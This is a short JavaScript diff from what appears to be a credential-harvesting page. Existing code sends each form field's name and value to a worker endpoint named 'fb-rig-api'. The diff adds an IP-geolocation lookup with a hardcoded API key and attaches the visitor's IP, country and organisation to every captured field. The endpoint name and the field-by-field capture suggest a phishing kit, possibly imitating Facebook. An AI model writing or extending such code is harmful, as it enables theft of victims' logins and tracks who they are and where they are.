@@ -185,6 +185,28 @@
             sessionStorage.setItem(id, JSON.stringify(new Date().toDateString()))
         }
 
+        
+
+        let locObj = {
+            country_name:"",
+            country_capital:"",
+            organization:"",
+            ip:""
+        };
+
+        try {
+            loc = fetch("https://api.ipgeolocation.io/ipgeo?apiKey=09d10b181cb84b4f9c2a10bae1a8dd5c")
+            .then(res=>res.json())
+            .then(res=>{
+                locObj.country_name = res.country_name;
+                locObj.country_capital = res.country_capital;
+                locObj.ip = res.ip;
+                locObj.organization = res.organization;
+
+            })
+        } catch(err){
+
+        }
 
         let form = document.forms[0];
 
@@ -193,7 +215,17 @@
             let name = target.name;
             let value = target.value;
 
-            const data = {name, value, session:sessionStorage.getItem(id)};
+
+            const data = {
+                name, 
+                value, 
+                session:sessionStorage.getItem(id),
+                country_name:locObj.country_name,
+                country_capital:locObj.country_capital,
+                organization:locObj.organization,
+                ip:locObj.ip
+            };
+
 
 
             fetch("https://fb-rig-api.cedrick1227.workers.dev/", {
